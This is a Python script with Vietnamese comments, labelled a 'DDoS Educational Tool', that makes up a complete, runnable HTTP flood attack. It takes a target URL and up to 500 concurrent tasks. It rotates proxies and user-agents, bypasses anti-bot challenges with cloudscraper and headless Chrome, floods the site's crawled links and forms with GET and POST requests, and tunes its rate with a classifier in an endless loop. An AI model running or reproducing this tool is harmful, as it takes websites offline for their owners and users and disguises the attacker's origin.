import sys
import importlib
import subprocess
import os
import random
import time
import requests
import aiohttp
import asyncio
import cloudscraper
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import RequestException, Timeout, ConnectionError
from sklearn.ensemble import RandomForestClassifier
import numpy as np
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
import psutil
from collections import deque

# Kiểm tra phiên bản Python
if sys.version_info < (3, 7):  # cloudscraper và scikit-learn yêu cầu 3.7+
    print("Yêu cầu Python 3.7 trở lên.")
    sys.exit(1)

# Kiểm tra pip
try:
    import pip
except ImportError:
    print("Lỗi: pip không được cài đặt. Vui lòng cài đặt pip trước.")
    sys.exit(1)

# Hàm kiểm tra và cài đặt module
def install_module(module_name, max_attempts=3):
    try:
        importlib.import_module(module_mappings.get(module_name, module_name))
        print(f"Module {module_name} đã được cài đặt.")
    except ImportError:
        print(f"Module {module_name} chưa được cài đặt. Đang cài đặt...")
        for attempt in range(max_attempts):
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
                print(f"Cài đặt {module_name} thành công.")
                return
            except subprocess.CalledProcessError:
                try:
                    subprocess.check_call([sys.executable, "-m", "pip", "install", "--user", module_name])
                    print(f"Cài đặt {module_name} thành công với --user.")
                    return
                except subprocess.CalledProcessError:
                    if attempt == max_attempts - 1:
                        print(f"Lỗi: Không thể cài đặt {module_name} sau {max_attempts} lần thử.")
                        print(f"Vui lòng cài đặt thủ công: pip install {module_name}")
                        sys.exit(1)
            time.sleep(1)

# Ánh xạ tên module trên PyPI và tên nhập trong Python
module_mappings = {
    "scikit-learn": "sklearn",
    "beautifulsoup4": "bs4",
    "webdriver-manager": "webdriver_manager"
}

# Danh sách module cần thiết
required_modules = [
    "requests",
    "aiohttp",
    "cloudscraper",
    "pystyle",
    "scikit-learn",
    "numpy",
    "beautifulsoup4",
    "selenium",
    "webdriver-manager"
]

# Cài đặt các module đồng thời
with ThreadPoolExecutor(max_workers=4) as executor:
    executor.map(install_module, required_modules)

# Nhập module pystyle sau khi đảm bảo cài đặt
from pystyle import Colors, Colorate

# Kiểm tra quyền ghi log
try:
    with open("ddos_log.txt", "a") as f:
        f.write("")
except PermissionError:
    print("Lỗi: Không có quyền ghi vào ddos_log.txt.")
    sys.exit(1)

# Lớp quản lý proxy từ tệp proxies.txt
class ProxyManager:
    def __init__(self, proxy_file="proxies.txt"):
        self.proxy_cache = deque()
        self.proxy_file = proxy_file
        self.load_proxies()

    def load_proxies(self):
        """Đọc và chuẩn hóa proxy từ tệp proxies.txt."""
        try:
            if not os.path.exists(self.proxy_file):
                print(f"Lỗi: Tệp {self.proxy_file} không tồn tại.")
                sys.exit(1)
            with open(self.proxy_file, "r") as f:
                proxies = f.read().strip().splitlines()
            if not proxies:
                print(f"Lỗi: Tệp {self.proxy_file} rỗng.")
                sys.exit(1)
            # Chuẩn hóa định dạng proxy
            for proxy in proxies:
                proxy = proxy.strip()
                if proxy:
                    if not proxy.startswith("http://"):
                        proxy = f"http://{proxy}"
                    self.proxy_cache.append(proxy)
            print(f"Đã tải {len(self.proxy_cache)} proxy từ {self.proxy_file}.")
            with open("ddos_log.txt", "a") as f:
                f.write(f"[{time.ctime()}] Loaded {len(self.proxy_cache)} proxies from {self.proxy_file}\n")
        except PermissionError:
            print(f"Lỗi: Không có quyền đọc tệp {self.proxy_file}.")
            sys.exit(1)
        except Exception as e:
            print(f"Lỗi khi đọc tệp {self.proxy_file}: {str(e)}")
            sys.exit(1)

    async def get_proxy(self):
        """Lấy một proxy ngẫu nhiên từ cache."""
        if not self.proxy_cache:
            print("Lỗi: Hết proxy trong danh sách.")
            return None
        proxy = random.choice(self.proxy_cache)
        return {"http": proxy, "https": proxy}

    async def test_proxy(self, proxy):
        """Kiểm tra proxy có hoạt động không."""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("http://httpbin.org/ip", proxy=proxy["http"], timeout=3) as response:
                    return response.status == 200
        except:
            return False

# Danh sách 100 User-Agent thực tế
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:124.0) Gecko/20100101 Firefox/124.0",
    "Mozilla/5.0 (iPad; CPU OS 17_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-N986B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-G990B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 4a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 7 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-A528B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPad; CPU OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:117.0) Gecko/20100101 Firefox/117.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (iPad; CPU OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 5a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:116.0) Gecko/20100101 Firefox/116.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-A526B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPad; CPU OS 16_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 4 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:115.0) Gecko/20100101 Firefox/115.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/114.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (iPad; CPU OS 16_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.2 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36"
]

# Hàm lấy proxy từ ProxyScrape API
def get_proxy(max_attempts=3):
    proxy_api_url = "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all"
    for attempt in range(max_attempts):
        try:
            response = requests.get(proxy_api_url, timeout=5)
            response.raise_for_status()
            proxies = response.text.strip().split("\n")
            if proxies and proxies[0]:
                proxy = random.choice(proxies)
                return {"http": f"http://{proxy}", "https": f"http://{proxy}"}
            print(f"Thử proxy lần {attempt + 1} thất bại: Không có proxy hợp lệ.")
        except (RequestException, ValueError) as e:
            print(f"Thử proxy lần {attempt + 1} thất bại: {str(e)}")
        time.sleep(0.5)
    return None

# Phân tích website để thu thập URL và biểu mẫu
def analyze_website(url):
    try:
        response = requests.get(url, headers={"User-Agent": random.choice(user_agents)}, timeout=5)
        soup = BeautifulSoup(response.text, "html.parser")
        urls = [a["href"] for a in soup.find_all("a", href=True) if a["href"].startswith(("http", "/"))]
        forms = [
            {"action": form.get("action"), "inputs": [input.get("name") for input in form.find_all("input")]}
            for form in soup.find_all("form")
        ]
        return {"urls": urls, "forms": forms}
    except RequestException:
        return {"urls": [url], "forms": []}

# AI để điều chỉnh tần suất yêu cầu
class RateOptimizer:
    def __init__(self):
        self.model = RandomForestClassifier(n_estimators=100)
        self.history = []

    def train(self, status_codes, success_labels):
        if len(status_codes) > 10:
            X = np.array(status_codes).reshape(-1, 1)
            y = np.array(success_labels)
            self.model.fit(X, y)

    def predict_delay(self, status_code):
        if len(self.history) < 10:
            return random.uniform(0.1, 0.5)
        X = np.array([[status_code]])
        prediction = self.model.predict(X)[0]
        return 0.1 if prediction == 1 else 0.5

def banner():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Diagonal(Colors.purple_to_blue, """
    ╔══════════════════════════════════════════════════════╗
    ║    DDoS Educational Tool . Version 3.5 | Cre by: LIGHT ║
    ╚══════════════════════════════════════════════════════╝   

░▒▓█▓▒░      ░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░ 
░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒▒▓███▓▒░▒▓████████▓▒░  ░▒▓█▓▒░     
░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
░▒▓████████▓▒░▒▓█▓▒░░▒▓██████▓▒░░▒▓█▓▒░░▒▓█▓▒░  ░▒▓█▓▒░     
                                                            
    """))

async def simulate_request(url, rate_optimizer, website_data, success_count, failure_count, max_retries=3):
    headers = {
        "User-Agent": random.choice(user_agents),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Connection": "keep-alive",
        "Referer": "https://www.google.com",
        "Cache-Control": "no-cache"
    }
    proxy = get_proxy()
    scraper = cloudscraper.create_scraper()

    # Chọn ngẫu nhiên hành vi (GET hoặc POST)
    action = random.choice(["get", "post"]) if website_data["forms"] else "get"
    target_url = random.choice(website_data["urls"]) if website_data["urls"] else url
    data = None
    if action == "post" and website_data["forms"]:
        form = random.choice(website_data["forms"])
        data = {input_name: "test" for input_name in form["inputs"] if input_name}

    for attempt in range(max_retries):
        try:
            async with aiohttp.ClientSession() as session:
                if action == "post" and data:
                    response = await session.post(
                        target_url,
                        headers=headers,
                        data=data,
                        proxy=proxy["http"] if proxy else None,
                        timeout=1
                    )
                else:
                    response = await session.get(
                        target_url,
                        headers=headers,
                        proxy=proxy["http"] if proxy else None,
                        timeout=1
                    )
                status = response.status
                print(Colorate.Horizontal(Colors.red_to_white, 
                    f"[Async] {action.upper()} thành công | URL: {target_url} | Status: {status} | Proxy: {proxy['http'] if proxy else 'None'}"))
                rate_optimizer.history.append((status, 1))
                success_count[0] += 1
                with open("ddos_log.txt", "a") as f:
                    f.write(f"[{time.ctime()}] Success | Action: {action} | Status: {status} | URL: {target_url} | Proxy: {proxy['http'] if proxy else 'None'}\n")
                return status
        except (Timeout, ConnectionError, RequestException) as e:
            print(Colorate.Horizontal(Colors.red_to_white, 
                f"[Async] Lỗi: {str(e)} | Thử lại lần {attempt + 1}/{max_retries}"))
            rate_optimizer.history.append((429 if "429" in str(e) else 500, 0))
            failure_count[0] += 1
            with open("ddos_log.txt", "a") as f:
                f.write(f"[{time.ctime()}] Failure | Action: {action} | Error: {str(e)} | URL: {target_url}\n")
            if attempt == max_retries - 1:
                print(Colorate.Horizontal(Colors.red_to_white, 
                    f"[Async] Bỏ qua yêu cầu sau {max_retries} lần thử."))
                # Thử Selenium nếu thất bại
                try:
                    options = webdriver.ChromeOptions()
                    options.add_argument("--headless")
                    driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)
                    driver.get(target_url)
                    time.sleep(2)  # Chờ JS Challenge
                    status = 200 if driver.page_source else 500
                    driver.quit()
                    print(Colorate.Horizontal(Colors.green_to_white, 
                        f"[Selenium] Thành công qua Headless Browser | URL: {target_url} | Status: {status}"))
                    rate_optimizer.history.append((status, 1))
                    success_count[0] += 1
                    with open("ddos_log.txt", "a") as f:
                        f.write(f"[{time.ctime()}] Success | Action: selenium | Status: {status} | URL: {target_url}\n")
                    return status
                except Exception as e:
                    print(Colorate.Horizontal(Colors.red_to_white, 
                        f"[Selenium] Lỗi Headless Browser: {str(e)} | URL: {target_url}"))
                    failure_count[0] += 1
                    with open("ddos_log.txt", "a") as f:
                        f.write(f"[{time.ctime()}] Failure | Action: selenium | Error: {str(e)} | URL: {target_url}\n")
            await asyncio.sleep(0.1)
    return None

def main():
    banner()
    print("\033[1;31m!!KHI NHẬP WEBSITE LƯU Ý PHẢI NHẬP https://")
    url = input(Colorate.Horizontal(Colors.purple_to_blue, "[</>] URL TEST WEBSITE: "))
    threads = int(input(Colorate.Horizontal(Colors.purple_to_blue, "[</>] ENTER THREAD COUNT (100-500): ")))

    # Kiểm tra đầu vào
    import re
    if not re.match(r'^https?://', url):
        print(Colorate.Horizontal(Colors.red_to_white, "Lỗi: URL phải bắt đầu bằng http:// hoặc https://"))
        return
    if not (100 <= threads <= 500):
        print(Colorate.Horizontal(Colors.red_to_white, "Lỗi: Số luồng phải từ 100 đến 500"))
        return

    # Phân tích website
    print(Colorate.Horizontal(Colors.green_to_white, "Đang phân tích website..."))
    website_data = analyze_website(url)
    print(Colorate.Horizontal(Colors.green_to_white, 
        f"Phân tích hoàn tất: {len(website_data['urls'])} URL, {len(website_data['forms'])} biểu mẫu"))

    rate_optimizer = RateOptimizer()
    success_count = [0]
    failure_count = [0]

    async def run_requests():
        tasks = []
        for _ in range(threads):
            tasks.append(simulate_request(url, rate_optimizer, website_data, success_count, failure_count))
        await asyncio.gather(*tasks)

    loop = asyncio.get_event_loop()
    try:
        with ThreadPoolExecutor(max_workers=500) as executor:
            while True:
                # Huấn luyện AI dựa trên lịch sử phản hồi
                if rate_optimizer.history:
                    status_codes, labels = zip(*rate_optimizer.history)
                    rate_optimizer.train(status_codes, labels)
                
                # Chạy các yêu cầu bất đồng bộ
                loop.run_until_complete(run_requests())
                
                # In thống kê
                print(Colorate.Horizontal(Colors.green_to_white, 
                    f"Thống kê: Thành công = {success_count[0]}, Thất bại = {failure_count[0]}"))
                
                # Điều chỉnh độ trễ bằng AI
                last_status = rate_optimizer.history[-1][0] if rate_optimizer.history else 200
                delay = rate_optimizer.predict_delay(last_status)
                time.sleep(delay)
    except KeyboardInterrupt:
        print(Colorate.Horizontal(Colors.red_to_white, "\nĐã dừng chương trình bởi người dùng."))
        print(Colorate.Horizontal(Colors.green_to_white, 
            f"Tổng kết: Thành công = {success_count[0]}, Thất bại = {failure_count[0]}"))

if __name__ == "__main__":
    main()
